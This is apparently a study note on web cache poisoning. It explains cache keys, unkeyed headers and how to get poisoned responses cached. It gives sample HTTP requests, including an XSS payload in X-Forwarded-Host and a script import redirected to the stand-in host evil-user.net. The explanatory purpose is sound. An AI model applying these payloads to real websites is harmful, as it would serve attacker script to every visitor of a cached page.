# Web cache poisoning

Two phases:

1. The attacker must work out how to elicit a response from the back-end server that inadvertently contains some kind of dangerous payload
2. Once successful, they need to make sure that their response is cached and subsequently served to the intended victims

<details>

<summary><strong>Cache keys</strong></summary>

When the cache gets an HTTP request, it decides whether to serve a cached response or forward the request to the origin server by generating a 'cache key.' This key is usually based on the URL path and query parameters but can also include headers and content type.

</details>

## <mark style="color:yellow;">Impact of a web cache poisoning attack</mark>

Depend on two key factors:

1. What exactly the attacker can successfully get cached
2. The amount of traffic on the affected page (visitors)

{% hint style="info" %}
**Note**: that the duration of a cache entry doesn't always impact web cache poisoning, as attacks can be scripted to re-poison the cache indefinitely.
{% endhint %}

## <mark style="color:yellow;">Constructing a web cache poisoning attack</mark>

1. Identify and evaluate unkeyed inputs
2. Elicit a harmful response from the back-end server
3. Get the response cached

### <mark style="color:yellow;">Identify and evaluate unkeyed inputs</mark>

Adding random inputs to requests and observing their effect on the response, whether it's directly reflected or triggers a different response.

{% hint style="info" %}
**Tip**: use Param Miner extension (Guess headers)
{% endhint %}

### <mark style="color:yellow;">Elicit a harmful response from the back-end server</mark>

Evaluate exactly how the website processes it. E.g. see if the input is reflected in the response from the server without being properly sanitized.

### <mark style="color:yellow;">Get the response cached</mark>

A cached response may depend on all kinds of factors, such as the file extension, content type, route, status code, and response headers

## <mark style="color:yellow;">Exploiting cache design flaws</mark>

### <mark style="color:yellow;">Web cache poisoning to deliver XSS</mark>

Simplest web cache poisoning vulnerability to exploit is when unkeyed input is reflected in a cacheable response without proper sanitization

```http
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: innocent-website.co.uk

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://innocent-website.co.uk/cms/social.png" />
```

* `X-Forwarded-Host` is being used to dynamically generate an Open Graph image URL
* `X-Forwarded-Host` is unkeyed
* Exploit: `X-Forwarded-Host: a."><script>alert(1)</script>"`
* If this response was cached, all users who accessed `/en?region=uk` would be served this XSS payload

### <mark style="color:yellow;">Web cache poisoning to exploit unsafe handling of resource imports</mark> <a href="#using-web-cache-poisoning-to-exploit-unsafe-handling-of-resource-imports" id="using-web-cache-poisoning-to-exploit-unsafe-handling-of-resource-imports"></a>

Some websites use unkeyed headers to dynamically generate URLs for importing resources, such as externally hosted JavaScript files.

```http
GET / HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: evil-user.net
User-Agent: Mozilla/5.0 Firefox/57.0

HTTP/1.1 200 OK
<script src="https://evil-user.net/static/analytics.js"></script>
```

### <mark style="color:yellow;">Web cache poisoning to exploit cookie-handling vulns</mark>

```http
GET /blog/post.php?mobile=1 HTTP/1.1
Host: innocent-website.com
User-Agent: Mozilla/5.0 Firefox/57.0
Cookie: language=pl;
Connection: close
```

* Premise (as always): `Cookie` header is unkeyed
* If the response to this request is cached, then all subsequent users who tried to access this blog post would receive the Polish

{% hint style="info" %}
**Note**: It is rare. Cookie-based cache poisoning vulnerabilities are usually quickly identified and resolved because legitimate users often accidentally poison the cache.
{% endhint %}

### <mark style="color:yellow;">Using multiple headers to exploit web cache poisoning vulnerabilities</mark>

```http
GET /random HTTP/1.1
Host: innocent-site.com
X-Forwarded-Proto: http

HTTP/1.1 301 moved permanently
Location: https://innocent-site.com/random
```

### <mark style="color:yellow;">Exploiting responses that expose too much information</mark>

#### Cache-control directives

A challenge in web cache poisoning is ensuring the harmful response gets cached, often requiring manual trial and error. However, sometimes responses reveal information that helps the attacker successfully poison the cache.

```http
HTTP/1.1 200 OK
Via: 1.1 varnish-v4
Age: 174
Cache-Control: public, max-age=1800
```

#### Vary header

* The `Vary` header specifies a list of additional headers that should be treated as part of the cache key even if they are normally unkeyed
  * For example, it is commonly used to specify that the `User-Agent` header is keyed
    * If the mobile version of a website is cached, this won't be served to non-mobile users by mistake.
* An attacker can also:
  * Attack only users with that user agent are affected
  * Work out which user agent was most commonly used to access the site (attack to affect the maximum number of users)

## <mark style="color:yellow;">Exploiting cache implementation flaws</mark>

TO DO
